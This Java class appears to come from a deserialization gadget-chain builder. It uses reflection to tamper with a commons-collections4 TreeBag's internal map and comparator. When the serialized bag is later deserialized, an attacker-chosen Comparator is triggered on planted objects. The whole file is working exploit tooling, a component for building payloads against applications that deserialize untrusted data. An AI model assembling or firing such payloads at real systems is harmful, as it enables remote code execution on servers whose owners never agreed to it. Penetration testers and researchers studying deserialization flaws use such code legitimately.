package org.ses.gadgetbuilder.impl.trampolines.compare;

import org.apache.commons.collections4.bag.TreeBag;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.Map;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
public class CC4Compare implements CompareTrampoline {

    @Override
    public Object wrapPayload(Comparator comp, Object param1, Object param2) {

        TreeBag tree = new TreeBag(comp);

        try {
            Map underlyingMap = (Map) Reflections.getFieldValue(tree, "map");

            // temporarily disable TreeMap comp
            Reflections.setFieldValue(underlyingMap, "comparator", new DummyComparator());

            int initModCount = (int) Reflections.getFieldValue(tree, "modCount");
            int initSize = (int) Reflections.getFieldValue(tree, "size");

            Field modCount = Reflections.getField(tree.getClass(), "modCount");
            Field size = Reflections.getField(tree.getClass(), "size");

            Object mutableInteger = Reflections.newInstance("org.apache.commons.collections4.bag.AbstractMapBag$MutableInteger", 1);

            modCount.set(tree, initModCount + 1);
            size.set(tree, initSize + 1);
            underlyingMap.put(param1, mutableInteger);

            modCount.set(tree, initModCount + 2);
            size.set(tree, initSize + 2);
            underlyingMap.put(param2, mutableInteger);

            Reflections.setFieldValue(underlyingMap, "comparator", comp);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return tree;
    }

    static class DummyComparator implements Comparator {
        @Override
        public int compare(Object o1, Object o2) {
            return 0;
        }
    }
}
